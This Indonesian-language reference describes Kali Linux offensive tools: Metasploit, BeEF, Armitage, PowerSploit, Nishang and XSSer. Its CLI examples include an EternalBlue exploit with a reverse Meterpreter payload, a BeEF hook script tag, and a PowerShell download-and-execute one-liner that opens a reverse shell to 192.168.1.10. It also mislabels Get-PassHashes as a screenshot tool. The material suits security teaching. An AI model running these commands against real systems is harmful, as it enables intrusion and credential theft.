# [Kali Linux Categories](https://github.com/kiyanami/Kali-Linux-Category/blob/main/Kali%20Linux%20Category.md)
# Execution

Dokumentasi teknis mengenai perangkat lunak dan instrumen *open-source* yang diklasifikasikan ke dalam kategori **Execution** pada ekosistem keamanan siber Kali Linux.

## Daftar Isi
- [1. Metasploit Framework](#1-metasploit-framework)
- [2. BeEF (Browser Exploitation Framework)](#2-beef-browser-exploitation-framework)
- [3. Armitage](#3-armitage)
- [4. PowerSploit & Nishang](#4-powersploit--nishang)
  - [Bagian I: PowerSploit](#bagian-i-powersploit)
  - [Bagian II: Nishang](#bagian-ii-nishang)
  - [Perbandingan Singkat & Kesimpulan Akademis](#perbandingan-singkat--kesimpulan-akademis)
- [5. XSSer (Cross-Site Scripting Exploiter)](#5-xsser-cross-site-scripting-exploiter)

---

## 1. Metasploit Framework

Salah satu platform *penetration testing* paling populer di dunia. Di dalam kategori **Execution**, Metasploit digunakan untuk mengirimkan dan mengeksekusi berbagai macam *payload* (seperti Meterpreter) setelah celah keamanan ditemukan pada target.

### Deskripsi Perangkat Lunak
**Metasploit Framework** adalah sebuah platform rekayasa eksploitasi dan pengujian penetrasi *open-source* berbasis bahasa pemrograman Ruby. Di dalam taksonomi resmi Kali Linux, instrumen ini diklasifikasikan secara lintas-kategori sebagai perangkat lunak multifungsi pada fase: **Initial Access**, **Execution**, **Privilege Escalation**, dan **Command and Control (C2)**.

Secara arsitektural, Metasploit beroperasi sebagai kerangka kerja modular (*modular architecture*) yang memisahkan antara kode eksploitasi (*exploit*), muatan instruksi (*payload*), dan mekanisme penyamaran (*encoder*). Pendekatan abstraksi ini memungkinkan peneliti keamanan siber mengembangkan, menguji, serta mengeksekusi vektor serangan terhadap berbagai arsitektur sistem operasi dan layanan jaringan secara terstandardisasi melalui antarmuka baris perintah interaktif (`msfconsole`).

### Kegunaan (*Use Case*) dalam Keamanan Siber
Dalam domain riset akademik, audit infrastruktur, dan simulasi ofensif/defensif, Metasploit Framework diaplikasikan untuk skenario-skenario strategis berikut:
* **Validasi Kerentanan Sistem (*Vulnerability Verification*):** Membantu penguji penetrasi (*penetration tester*) membuktikan apakah kerentanan yang teridentifikasi pada fase pemindaian (*vulnerability scanning*) benar-benar dapat dieksploitasi secara nyata (*exploitable*), sehingga mengurangi temuan positif palsu (*false positives*).
* **Simulasi Siklus Serangan Lengkap (*End-to-End Adversary Simulation*):** Digunakan oleh praktisi *Red Team* untuk menyimulasikan seluruh rantai serangan siber (*Cyber Kill Chain*), mulai dari perolehan akses awal (*initial access*), eksekusi kode jarak jauh, eskalasi hak istimewa (*privilege escalation*), hingga pergerakan lateral di dalam jaringan korporat.
* **Pengembangan dan Pengujian IDS/IPS/EDR (*Blue Team Benchmarking*):** Memungkinkan analis pertahanan dan peneliti keamanan menguji keandalan aturan tanda tangan (*signatures*) dan deteksi heuristik pada *Intrusion Detection/Prevention System* (IDS/IPS) serta *Endpoint Detection and Response* (EDR) terhadap pola eksploitasi yang diketahui.

### Fungsi Teknis (*Functionality*)
Metasploit Framework mengimplementasikan otomasi siklus hidup eksploitasi tingkat lanjut melalui enam komponen fungsional modular utama:
* **Modul Eksploitasi (*Exploits*):** Kumpulan kode yang dirancang khusus untuk memanfaatkan celah keamanan spesifik pada perangkat lunak, layanan jaringan, atau sistem operasi target (seperti *buffer overflow*, kerentanan deserialisasi, atau kesalahan konfigurasi autentikasi) guna membajak alur eksekusi program.
* **Modul Muatan (*Payloads & Meterpreter*):** Potongan kode arbitrer yang dikirimkan dan dieksekusi di memori target setelah eksploitasi berhasil. Metasploit mengintegrasikan **Meterpreter**, sebuah *payload* canggih berbasis injeksi DLL di dalam memori (*in-memory execution*) yang tidak menyentuh cakram keras (*diskless*), sehingga meminimalkan jejak forensik dan deteksi antivirus.
* **Modul Penunjang (*Auxiliary*):** Berfungsi melakukan tugas-tugas non-eksploitasi yang krusial selama fase pengintaian dan analisis, meliputi pemindaian port, *fuzzing* protokol, *sniffing* lalu lintas jaringan, enumerasi layanan (SMB, SSH, HTTP), hingga serangan *denial-of-service* (DoS).
* **Modul Pasca-Eksploitasi (*Post-Exploitation*):** Menyediakan serangkaian skrip otomatis untuk beroperasi setelah akses berhasil didapatkan, seperti ekstraksi kredensial memori (*credential dumping*), pencatatan ketikan papan ketik (*keylogging*), eskalasi hak istimewa lokal (*local privilege escalation*), serta mekanisme *pivoting* untuk menjadikan mesin target sebagai jembatan menuju sub-jaringan internal yang terisolasi.
* **Modul Pengode dan Penghindar Deteksi (*Encoders & Evasion*):** Bertugas memodifikasi struktur biner *payload* menggunakan algoritma penyandian polimorfik guna menghilangkan karakter rusak (*bad characters*) sekaligus melewati sistem pemindaian antivirus statis.
* **Manajemen Basis Data Terintegrasi:** Terhubung langsung dengan basis data PostgreSQL untuk menyimpan, mengindeks, dan mengkorelasikan hasil pemindaian *host*, layanan, kerentanan, serta kredensial yang berhasil dikumpulkan selama operasi pengujian berlangsung.

### Contoh Perintah CLI
```bash
# Menjalankan konsol interaktif Metasploit
msfconsole

# Memilih modul eksploitasi, mengatur payload Meterpreter, dan mengeksekusi
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Kesimpulan
Secara akademis, Metasploit Framework merepresentasikan standardisasi rekayasa eksploitasi modern yang mengubah pengujian keamanan dari sekadar manipulasi kode manual yang rumit menjadi disiplin metodologis yang terstruktur dan dapat direproduksi. Keberadaannya di Kali Linux menegaskan pentingnya pendekatan pertahanan berlapis (*defense-in-depth*), manajemen tambalan perangkat lunak (*patch management*) yang disiplin, serta pemantauan anomali memori secara proaktif pada setiap infrastruktur komputasi.

---

## 2. BeEF (Browser Exploitation Framework)

Alat yang berfokus pada eksploitasi melalui peramban web (*web browser*). BeEF bekerja dengan cara menyuntikkan skrip (*hook*) ke peramban target, memungkinkan *pentester* mengeksekusi perintah-perintah khusus langsung di sisi klien melalui aplikasi web.

### Deskripsi Perangkat Lunak
**BeEF (Browser Exploitation Framework)** adalah sebuah instrumen pengujian penetrasi *open-source* berbasis bahasa pemrograman Ruby yang berfokus secara khusus pada eksploitasi peramban web (*web browser*). Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Execution** serta sub-kategori *System Services* (di bawah kelompok *Services and Other Tools* sebagai skrip kontrol layanan `beef-xss-start` dan `beef-xss-stop`).

Secara arsitektural, BeEF mengubah paradigma pengujian keamanan dari serangan berorientasi jaringan perimeter menuju evaluasi vektor ancaman di sisi klien (*client-side attack vectors*). Alat ini bekerja dengan menyuntikkan skrip JavaScript jahat bernama `hook.js` ke dalam sesi peramban target—biasanya melalui celah *Cross-Site Scripting* (XSS) atau teknik rekayasa sosial. Setelah peramban mengeksekusi skrip tersebut (*hooked browser*), BeEF membangun saluran komunikasi *Command and Control* (C2) berbasis *polling* HTTP/WebSockets, menjadikan peramban web korban sebagai titik tumpu (*beachhead*) untuk melancarkan eksploitasi lanjutan.

### Kegunaan (*Use Case*) dalam Keamanan Siber
Dalam domain riset akademik, audit aplikasi web, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), BeEF diaplikasikan untuk skenario-skenario strategis berikut:
* **Demonstrasi Dampak Nyata Kerentanan XSS (*XSS Impact Validation*):** Membantu penguji penetrasi (*penetration tester*) membuktikan kepada pemangku kepentingan bahwa kerentanan *Cross-Site Scripting* bukan sekadar *bug* kosmetik (seperti memunculkan kotak dialog `alert()`), melainkan celah kritis yang memungkinkan pengambilalihan kendali penuh atas sesi pengguna.
* **Pivoting Jaringan Internal melalui Sisi Klien (*Client-Side Network Pivoting*):** Digunakan oleh praktisi *Red Team* untuk memetakan dan berinteraksi dengan aset jaringan lokal (*intranet*) di balik *firewall* atau NAT korporat dengan memanfaatkan konteks hak akses jaringan yang dimiliki oleh peramban korban.
* **Evaluasi Keamanan Peramban dan Kebijakan CSP (*Blue Team Benchmarking*):** Memungkinkan analis pertahanan menguji efektivitas implementasi *Content Security Policy* (CSP), atribut `HttpOnly` pada *cookie*, serta mekanisme isolasi *sandbox* pada peramban web modern terhadap eksekusi skrip eksternal yang tidak sah.

### Fungsi Teknis (*Functionality*)
BeEF mengimplementasikan otomatisasi kontrol dan eksploitasi sesi peramban tingkat lanjut melalui lima mekanisme fungsional utama:
* **Mekanisme Pengaitan Peramban (*Browser Hooking & Persistence*):** Menyediakan berkas JavaScript modular (`hook.js`) yang memantau status aktif tab korban. BeEF dilengkapi fitur persistensi (seperti teknik *pop-under windows* atau injeksi bingkai tersembunyi/*hidden iframes*) untuk mempertahankan koneksi C2 selama peramban masih terbuka.
* **Pemindaian Lingkungan Klien (*Client-Side Fingerprinting*):** Secara otomatis mengekstrak metadata terperinci dari sistem target sesaat setelah peramban terkait, meliputi jenis dan versi peramban, sistem operasi, resolusi layar, daftar ekstensi atau *plugin* yang terpasang, hingga alamat IP internal melalui kebocoran WebRTC.
* **Eksekusi Modul Perintah Dinamis (*Modular Command Execution*):** Menyediakan ratusan modul eksploitasi siap pakai yang dapat dieksekusi secara *real-time* melalui antarmuka web administratif, mencakup:
  * *Credential Harvesting & Social Engineering* (menampilkan kotak dialog otentikasi palsu seperti Clippy, pemberitahuan pembaruan ekstensi palsu, atau kloning halaman login).
  * *Session Hijacking* (pencurian token sesi, *cookie* non-`HttpOnly`, serta perekaman ketikan tombol/*keylogging* di dalam halaman web terkait).
  * *Hardware Access* (meminta atau mengeksploitasi izin akses kamera web/*webcam*, mikrofon, dan geolokasi).
* **Penjelajahan dan Pemindaian Jaringan Internal (*Internal Network Discovery & Tunneling*):** Memanfaatkan peramban korban sebagai proksi (*inter-protocol exploitation* dan *cross-origin requests*) untuk memindai port aktif pada alamat IP lokal (seperti `192.168.x.x`), mengidentifikasi perangkat *router* atau aplikasi intranet, serta melancarkan serangan *Cross-Site Request Forgery* (CSRF) terhadap layanan internal.
* **Integrasi dengan Metasploit Framework:** Mendukung interkoneksi langsung dengan Metasploit API, memungkinkan analis meluncurkan eksploitasi memori tingkat sistem operasi atau mendistribusikan *payload* biner (*executable*) apabila ditemukan komponen perangkat lunak usang di lingkungan klien.

### Contoh Perintah CLI
```bash
# Memulai layanan BeEF di Kali Linux
sudo beef-xss-start

# Menghentikan layanan BeEF setelah selesai
sudo beef-xss-stop

# Contoh skrip hook JavaScript yang disuntikkan ke halaman web rentan XSS
# <script src="http://192.168.1.10:3000/hook.js"></script>
```

### Kesimpulan
Secara akademis, BeEF membuktikan bahwa peramban web modern telah berevolusi menjadi sistem operasi virtual yang kompleks, menjadikannya permukaan serangan (*attack surface*) yang sangat krusial. Keberadaannya di Kali Linux menegaskan bahwa pertahanan perimeter jaringan tradisional tidak cukup untuk melindungi pengguna; perlindungan menyeluruh menuntut penerapan sanitasi input yang ketat untuk mencegah XSS, konfigurasi *Content Security Policy* (CSP) yang presisi, serta pengelolaan sesi otentikasi yang terisolasi dengan aman.

---

## 3. Armitage

Antarmuka grafis (GUI) berbasis Java untuk Metasploit. Alat ini mempermudah proses eksekusi serangan secara visual, mulai dari manajemen target hingga otomatisasi eksekusi *exploit* hanya dengan beberapa klik.

### Deskripsi Perangkat Lunak
**Armitage** adalah sebuah instrumen manajemen serangan siber berbasis antarmuka grafis (*Graphical User Interface* / GUI) yang dikembangkan menggunakan bahasa pemrograman Java sebagai lapisan visualisasi bagi Metasploit Framework. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Execution** dan **Command and Control (C2)**.

Secara arsitektural, Armitage bertindak sebagai klien *front-end* yang berkomunikasi dengan layanan *backend* Metasploit melalui protokol *Remote Procedure Call* (`msfrpcd`) dan basis data PostgreSQL. Desain ini memungkinkan penguji penetrasi untuk memvisualisasikan topologi target jaringan, memetakan vektor eksploitasi yang relevan secara otomatis, serta mengelola sesi pasca-eksploitasi secara interaktif dalam satu ruang kerja terpadu.

### Kegunaan (*Use Case*) dalam Keamanan Siber
Dalam domain riset akademik, pelatihan keamanan informasi, dan operasi simulasi siber, Armitage diaplikasikan untuk skenario-skenario strategis berikut:
* **Operasi Red Teaming Kolaboratif (*Team-Based Penetration Testing*):** Memungkinkan beberapa analis keamanan untuk terhubung ke satu server tim (*Team Server*) yang sama secara bersamaan, berbagi sesi Meterpreter, mengoordinasikan serangan, serta memantau log aktivitas tim secara *real-time* selama simulasi serangan berskala besar.
* **Visualisasi Topologi dan Status Kompromi (*Attack Surface Visualization*):** Membantu praktisi keamanan memetakan kondisi jaringan target secara visual—membedakan sistem operasi (*fingerprinting*), layanan aktif, hingga menandai mesin yang telah berhasil dikuasai secara visual (ditandai dengan ikon petir merah).
* **Media Pembelajaran Eksploitasi Terstruktur (*Cybersecurity Education*):** Menjadi instrumen pedagogis yang efektif dalam lingkungan laboratorium akademis untuk mendemonstrasikan alur kerja *Cyber Kill Chain* (dari pemindaian, pemilihan eksploit, hingga *pivoting*) tanpa terhambat oleh kompleksitas penghafalan sintaks baris perintah konsol.

### Fungsi Teknis (*Functionality*)
Armitage mengimplementasikan otomatisasi orkestrasi serangan dan kontrol jarak jauh melalui lima mekanisme fungsional utama:
* **Pemindaian dan Pemetaan Target Terintegrasi (*Integrated Scanning & Enumeration*):** Mengintegrasikan utilitas pemindai jaringan (seperti Nmap dan modul *auxiliary* Metasploit) langsung ke dalam antarmuka grafis, lalu mengimpor hasilnya ke basis data untuk menampilkan ikon komputer target beserta informasi sistem operasi dan port yang terbuka.
* **Rekomendasi Eksploit Otomatis (*Automated Exploit Suggestion / Find Attacks*):** Menganalisis informasi layanan dan versi perangkat lunak yang ditemukan pada setiap *host* target, kemudian menyaring dan menampilkan hanya modul eksploitasi Metasploit yang relevan dan berpotensi berhasil untuk setiap mesin secara spesifik.
* **Eksploitasi Massal Otomatis (*Hail Mary Attack Mode*):** Menyediakan fitur serangan otomatis menyeluruh yang meluncurkan seluruh modul eksploitasi yang cocok terhadap seluruh target dalam jaringan secara berurutan berdasarkan tingkat keandalan (*ranking*) modul, berguna untuk audit ketahanan cepat di lingkungan laboratorium.
* **Manajemen Sesi dan Pasca-Eksploitasi Visual (*Interactive Post-Exploitation & C2*):** Menyediakan menu konteks klik-kanan pada mesin yang telah terkompromi untuk mengeksekusi tugas-tugas *Command and Control* secara instan, meliputi pembukaan terminal interaktif, penjelajahan sistem berkas, pengambilan tangkapan layar (*screenshot*), *keylogging*, hingga ekstraksi *hash* kredensial.
* **Otomatisasi Pivoting Jaringan (*Visual Network Pivoting*):** Mempermudah konfigurasi rute lalu lintas (SOCKS *proxy* dan *port forwarding*) melalui mesin yang telah dikuasai, memungkinkan analis untuk memindai dan menyerang sub-jaringan internal yang sebelumnya terisolasi dari jaringan penguji.

### Contoh Perintah CLI
```bash
# Memastikan layanan basis data PostgreSQL aktif sebelum menjalankan Armitage
sudo systemctl start postgresql
sudo msfdb init

# Menjalankan antarmuka grafis Armitage
sudo armitage

# Menjalankan Team Server untuk kolaborasi multi-pengguna (opsional)
sudo teamserver 192.168.1.10 password_tim
```

### Kesimpulan
Secara akademis, Armitage merepresentasikan evolusi antarmuka orkestrasi keamanan ofensif yang menyederhanakan kompleksitas pengelolaan banyak target dan sesi eksploitasi secara simultan. Keberadaannya di Kali Linux menegaskan pentingnya pemahaman mengenai koordinasi serangan terpusat (*Command and Control*) serta urgensi segmentasi jaringan internal guna mencegah eskalasi kompromi berantai akibat teknik *pivoting*.

---

## 4. PowerSploit & Nishang

Kumpulan skrip dan modul berbasis PowerShell yang dirancang khusus untuk fase pasca-eksploitasi (terutama pada lingkungan Windows). Keduanya digunakan untuk mengeksekusi perintah tersembunyi, memuat kode langsung ke dalam memori (*fileless execution*), dan mengontrol sistem operasi target.

### Bagian I: PowerSploit

#### Deskripsi Perangkat Lunak
**PowerSploit** adalah sebuah kumpulan modul dan skrip *open-source* berbasis bahasa skrip Microsoft PowerShell yang dirancang khusus untuk memfasilitasi fase pasca-eksploitasi (*post-exploitation*) dan eksekusi kode pada sistem target berbasis Windows.

Secara arsitektural, PowerSploit bekerja dengan memanfaatkan akses penuh PowerShell terhadap Windows API, .NET Framework, serta Windows Management Instrumentation (WMI). Desain ini memungkinkan analis keamanan untuk mengeksekusi operasi tingkat rendah—seperti injeksi memori dan ekstraksi kredensial—langsung di dalam ruang memori proses yang sah tanpa harus mengunggah atau menulis berkas biner `.exe` maupun `.dll` ke dalam media penyimpanan fisik (*diskless execution*).

#### Kegunaan (*Use Case*) dalam Keamanan Siber
* **Simulasi Pasca-Eksploitasi Tanpa Berkas (*Fileless Post-Exploitation*):** Membantu praktisi *Red Team* mempertahankan kendali dan memperluas akses pada mesin Windows yang telah terkompromi sambil menghindari deteksi antivirus berbasis pemindaian cakram (*disk-based signature detection*).
* **Audit Keamanan Lingkungan Active Directory:** Digunakan untuk memetakan hubungan kepercayaan, hak akses pengguna, serta celah salah konfigurasi pada jaringan korporat berbasis domain Windows.
* **Pengujian Pertahanan Endpoint (*Blue Team & EDR Benchmarking*):** Memungkinkan analis pertahanan menguji efektivitas fitur keamanan modern Windows (seperti *Antimalware Scan Interface* / AMSI, *Constrained Language Mode*, dan *PowerShell Script Block Logging*) dalam mendeteksi penyalahgunaan skrip PowerShell.

#### Fungsi Teknis (*Functionality*)
PowerSploit terstruktur ke dalam beberapa modul fungsional spesifik:
* **CodeExecution:** Menyediakan fungsi injeksi tingkat rendah seperti `Invoke-Shellcode` dan `Invoke-DllInjection` untuk menyuntikkan *shellcode* (misalnya muatan Meterpreter) atau pustaka DLL secara reflektif (*Reflective PE/DLL Injection*) ke dalam memori proses Windows yang sedang berjalan.
* **Exfiltration & Credential Access:** Mengintegrasikan modul seperti `Invoke-Mimikatz` yang memuat pustaka Mimikatz langsung ke dalam memori untuk mengekstrak kredensial teks biasa, *hash* NTLM, dan tiket Kerberos dari proses `lsass.exe` tanpa menyentuh cakram keras.
* **PrivilegeEscalation:** Menyediakan skrip enumerasi otomatis (`PowerUp`) yang memindai kelemahan konfigurasi lokal sistem operasi Windows—seperti layanan dengan izin direktori yang tidak aman (*unquoted service paths*) atau izin registri yang lemah—guna meningkatkan hak akses dari pengguna standar menjadi `NT AUTHORITY\SYSTEM`.
* **Reconnaissance:** Mengintegrasikan modul seperti `PowerView` untuk melakukan enumerasi mendalam terhadap jaringan Active Directory, mencakup pemetaan pengguna domain, grup, *Access Control Lists* (ACL), serta lokasi sesi pengguna aktif.
* **AntivirusBypass:** Menyediakan utilitas seperti `Find-AVSignature` untuk mengidentifikasi pola *byte* spesifik yang memicu deteksi tanda tangan antivirus pada sebuah muatan biner.

---

### Bagian II: Nishang

#### Deskripsi Perangkat Lunak
**Nishang** adalah sebuah *framework* dan koleksi skrip *open-source* berbasis PowerShell yang dirancang untuk mendukung seluruh siklus pengujian penetrasi, mencakup fase akses awal (*initial access*), eksekusi muatan (*payload execution*), persistensi, hingga pasca-eksploitasi pada lingkungan Windows.

Berbeda dengan PowerSploit yang lebih berfokus pada manipulasi API tingkat rendah dan *post-exploitation* mendalam, Nishang memiliki orientasi yang sangat kuat pada pengiriman muatan (*payload delivery*) yang kreatif melalui dokumen atau media rekayasa sosial, serta pembangunan saluran komunikasi jarak jauh (*interactive shells*) melalui berbagai protokol jaringan.

#### Kegunaan (*Use Case*) dalam Keamanan Siber
* **Rekayasa Senjata Dokumen (*Client-Side Payload Weaponization*):** Membantu penguji penetrasi mengonversi skrip eksploitasi PowerShell menjadi format dokumen perkantoran yang umum digunakan (seperti berkas `.doc`, `.xls`, atau `.chm`) untuk menguji kerentanan manusia dan perimeter email.
* **Pembangunan Saluran Komunikasi Rahasia (*Covert C2 Channels*):** Digunakan untuk membangun koneksi *reverse shell* atau *bind shell* melalui protokol jaringan standar maupun non-standar (seperti TCP, UDP, HTTP/HTTPS, hingga ICMP dan DNS) guna melewati pembatasan *firewall* keluar (*egress filtering*).
* **Simulasi Persistensi dan Pengumpulan Informasi:** Membantu tim keamanan mengevaluasi bagaimana skrip administratif dapat ditanamkan secara persisten di dalam registri atau tugas terjadwal Windows (*Scheduled Tasks*) untuk mengumpulkan informasi sistem secara berkelanjutan.

#### Fungsi Teknis (*Functionality*)
Nishang mengimplementasikan beragam skrip modular yang dikelompokkan berdasarkan fase serangan:
* **Shells (Komunikasi Interaktif Multi-Protokol):** Menyediakan berbagai variasi skrip *reverse* dan *bind shell* (seperti `Invoke-PowerShellTcp`, `Invoke-PowerShellUdp`, `Invoke-PowerShellIcmp`, dan `Invoke-PowerShellDns`) yang memungkinkan interaksi terminal penuh dengan mesin target menggunakan protokol jaringan alternatif.
* **Client (Generator Artefak Sisi Klien):** Mengintegrasikan skrip seperti `Out-Word`, `Out-Excel`, `Out-CHM`, dan `Out-Shortcut` yang secara otomatis menyematkan muatan perintah PowerShell ke dalam berkas Microsoft Office, berkas bantuan HTML terkompilasi, atau pintasan Windows (`.lnk`) untuk skenario *phishing*.
* **Execution & Obfuscation:** Menyediakan utilitas seperti `Invoke-Encode` dan `Invoke-Decode` untuk menyamarkan teks skrip menggunakan pengkodean Base64 atau kompresi Deflate, serta fitur pengunduhan dan eksekusi skrip langsung dari memori (`Download_Execute`).
* **Gather (Pengumpulan Artefak Sistem):** Menyediakan skrip otomatis untuk mengekstrak informasi sensitif pasca-eksploitasi, termasuk pencatatan ketikan tombol (*Keylogger*), pengambilan tangkapan layar (`Get-PassHashes`), dan pemindaian informasi jaringan lokal.
* **Backdoors & Persistence:** Mengintegrasikan skrip seperti `Add-Persistence` dan `HTTP-Backdoor` untuk menanamkan pemicu eksekusi otomatis berbasis *WMI Event Subscriptions* atau kunci registri `Run`, memastikan skrip dieksekusi kembali setiap kali sistem dinyalakan ulang.

### Contoh Perintah CLI
```bash
# Mengakses direktori skrip PowerSploit dan Nishang di Kali Linux
ls -la /usr/share/windows-resources/powersploit/
ls -la /usr/share/nishang/

# Menyajikan skrip via HTTP server sederhana di Kali Linux untuk eksekusi in-memory
python3 -m http.server 8080 --directory /usr/share/nishang/Shells/

# Contoh eksekusi in-memory di sisi target Windows (PowerShell):
# powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.10 -Port 4444"
```

### Perbandingan Singkat & Kesimpulan Akademis

| Aspek Komparasi | PowerSploit | Nishang |
| :--- | :--- | :--- |
| **Fokus Utama** | Eksploitasi API tingkat rendah, injeksi memori, dan enumerasi Active Directory (*Post-Exploitation*). | Pengiriman muatan berbasis dokumen (*Client-Side*), pembangunan *shell* multi-protokol, dan persistensi. |
| **Kekuatan Khas** | Modul reflektif memori (`Invoke-Mimikatz`, `Invoke-Shellcode`) serta audit privilese (`PowerUp`, `PowerView`). | Kemampuan membungkus skrip ke dalam dokumen Office (`Out-Word`) dan *tunneling shell* via DNS/ICMP. |

Secara akademis, PowerSploit dan Nishang membuktikan bahwa bahasa skrip administratif modern yang memiliki integrasi mendalam dengan sistem operasi merupakan pedang bermata dua. Keberadaan keduanya di Kali Linux menegaskan bahwa pertahanan Windows modern tidak cukup hanya mengandalkan pemindaian berkas statis, melainkan wajib mengaktifkan mekanisme telemetri tingkat skrip seperti AMSI, *PowerShell Constrained Language Mode*, serta pencatatan log terpusat (*Script Block Logging*) untuk mendeteksi anomali perilaku di dalam memori.

---

## 5. XSSer (Cross-Site Scripting Exploiter)

Alat otomatis yang digunakan untuk mendeteksi serta mengeksekusi serangan berbasis *Cross-Site Scripting* (XSS). Alat ini mempermudah *bypass* pengamanan web untuk menjalankan skrip berbahaya pada peramban pengguna.

### Deskripsi Perangkat Lunak
**XSSer (Cross-Site Scripting Exploiter)** adalah sebuah *framework* pengujian penetrasi *open-source* berbasis Python yang dirancang khusus untuk mengotomatisasi proses pendeteksian, validasi, dan eksploitasi kerentanan *Cross-Site Scripting* (XSS) pada aplikasi berbasis web. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Execution**.

Secara arsitektural, XSSer bekerja dengan memindai titik masuk (*entry points*) input pengguna pada aplikasi web—baik melalui parameter kueri URL (GET), isi formulir (POST), maupun HTTP Headers—untuk menguji bagaimana server dan peramban memproses karakter khusus HTML/JavaScript. Perangkat ini dilengkapi dengan antarmuka baris perintah (CLI) sekaligus antarmuka grafis berbasis web/desktop (GTK GUI), serta mengintegrasikan berbagai teknik pengaburan (*obfuscation*) guna menembus mekanisme penyaringan input standar.

### Kegunaan (*Use Case*) dalam Keamanan Siber
Dalam domain riset akademik, audit aplikasi web, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), XSSer diaplikasikan untuk skenario-skenario strategis berikut:
* **Audit Kerentanan Sisi Klien (*Client-Side Vulnerability Assessment*):** Membantu penguji penetrasi (*penetration tester*) dan pengembang mengidentifikasi parameter aplikasi web yang gagal menerapkan pengkodean keluaran (*output encoding*) atau sanitasi input yang memadai.
* **Evaluasi Efektivitas Filter dan WAF (*WAF & Sanitizer Benchmarking*):** Digunakan oleh tim pertahanan (*Blue Team*) untuk menguji ketangguhan aturan penyaringan pada *Web Application Firewall* (WAF) dan pustaka sanitasi HTML terhadap variasi vektor muatan XSS yang dimanipulasi secara sintaksis.
* **Simulasi Eksekusi Kode Arbitrer di Peramban (*Arbitrary Script Execution Simulation*):** Membantu praktisi keamanan mendemonstrasikan dampak nyata dari kerentanan XSS, seperti pembajakan sesi pengguna (*session hijacking*), modifikasi tampilan DOM secara ilegal (*defacement*), hingga pengalihan paksa (*malicious redirection*).

### Fungsi Teknis (*Functionality*)
XSSer mengimplementasikan otomatisasi pengujian dan eksploitasi XSS tingkat lanjut melalui lima mekanisme fungsional utama:
* **Mesin Penjelajah dan Pemindai Otomatis (*Automated Crawler & Spidering*):** Mampu menelusuri tautan di dalam suatu domain target secara rekursif untuk memetakan seluruh formulir dan parameter input yang berpotensi rentan terhadap injeksi skrip.
* **Dukungan Multi-Vektor Serangan XSS:** Menguji berbagai klasifikasi kerentanan XSS secara sistematis, meliputi *Reflected XSS* (pantulan langsung dalam respons HTTP), *Stored/Persistent XSS* (tersimpan di basis data server), serta analisis indikator *DOM-based XSS*.
* **Mesin Pengaburan dan Evasi Filter (*Payload Obfuscation & Bypassing Engine*):** Menyediakan beragam opsi *encoding* otomatis—seperti pengkodean heksadesimal, Unicode, karakter ASCII (`String.fromCharCode()`), manipulasi huruf besar/kecil, serta penyisipan karakter tak standar—untuk melewati *blacklist* kata kunci (seperti pemblokiran tag `<script>`) dan filter WAF.
* **Injeksi Muatan Eksploitasi Terintegrasi (*Pre-built Exploitation Payloads*):** Menyertakan templat vektor siap pakai untuk mengeksekusi aksi spesifik di peramban korban, termasuk pencurian *cookie* sesi (`document.cookie`), injeksi *iframe* tersembunyi, perekaman ketikan tombol (*keylogging*), hingga pemuatan skrip eksternal (seperti mengaitkan peramban ke *framework* BeEF).
* **Pelaporan dan Ekspor Data Terstruktur (*Forensic & Audit Reporting*):** Menghasilkan laporan analisis terperinci dalam format standar (seperti XML atau teks terstruktur) yang mendokumentasikan URL rentan, parameter target, jenis vektor injeksi yang berhasil, serta tingkat keberhasilan penetrasi.

### Contoh Perintah CLI
```bash
# Memindai parameter URL tertentu secara otomatis untuk mendeteksi kerentanan XSS
xsser --url "http://target-lab.local/search.php?q=XSS" --auto

# Menggunakan teknik pengaburan (Hex & String.fromCharCode) untuk melewati filter WAF
xsser --url "http://target-lab.local/profile.php?name=XSS" --Hex --Str

# Melakukan crawling otomatis pada domain target dan menyimpan hasil ke XML
xsser --url "http://target-lab.local" -c 3 --Cw=2 --xml="hasil_audit_xss.xml"
```

### Kesimpulan
Secara akademis, XSSer merepresentasikan pendekatan sistematis dalam menguji batas kepercayaan (*trust boundary*) antara server aplikasi web dan mesin peramban klien. Keberadaannya di Kali Linux menegaskan bahwa pertahanan terhadap ancaman eksekusi skrip di sisi klien tidak dapat mengandalkan penyaringan pola kata kunci (*blacklisting*) semata, melainkan menuntut penerapan pengkodean keluaran berbasis konteks (*context-aware output encoding*) serta kebijakan keamanan konten (*Content Security Policy* / CSP) yang ketat.

